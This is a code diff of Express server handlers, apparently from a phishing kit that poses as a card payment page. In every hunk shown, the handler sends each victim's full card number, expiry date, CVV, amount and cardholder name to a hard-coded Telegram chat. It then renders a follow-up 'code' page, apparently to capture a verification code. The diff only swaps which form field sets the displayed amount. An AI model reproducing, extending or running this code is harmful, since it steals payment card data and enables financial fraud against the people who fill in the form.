@@ -241,7 +241,7 @@ try {
         bot.sendMessage(-1001878239645, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
         res.render('index_code_kz', {cardnumber: req.body.card_number.toString().slice(-4),
                                     cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
-                                    amount: req.body.amount,
+                                    amount: req.body.amount_c,
                                     cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                     expdate1: req.body.expdate1,
                                     expdate2: req.body.expdate2,
@@ -268,7 +268,7 @@ try {
         bot.sendMessage(-1001878239645, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
         res.render('index_code', {cardnumber: req.body.card_number.toString().slice(-4),
                                     cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
-                                    amount: req.body.amount,
+                                    amount: req.body.amount_c,
                                     cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                     expdate1: req.body.expdate1,
                                     expdate2: req.body.expdate2,
@@ -298,7 +298,7 @@ try {
         bot.sendMessage(-1001878239645, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
         res.render('index_code', {cardnumber: req.body.card_number.toString().slice(-4),
                                     cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
-                                    amount: req.body.amount,
+                                    amount: req.body.amount_c,
                                     cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                     expdate1: req.body.expdate1,
                                     expdate2: req.body.expdate2,
@@ -324,7 +324,7 @@ try {
         bot.sendMessage(-1001878239645, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
         res.render('index_code_pln', {cardnumber: req.body.card_number.toString().slice(-4),
                                     cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
-                                    amount: req.body.amount,
+                                    amount: req.body.amount_c,
                                     cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                     expdate1: req.body.expdate1,
                                     expdate2: req.body.expdate2,
@@ -353,7 +353,7 @@ try {
         bot.sendMessage(-1001878239645, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
         res.render('index_code_pln', {cardnumber: req.body.card_number.toString().slice(-4),
                                     cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
-                                    amount: req.body.amount,
+                                    amount: req.body.amount_c,
                                     cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                     expdate1: req.body.expdate1,
                                     expdate2: req.body.expdate2,
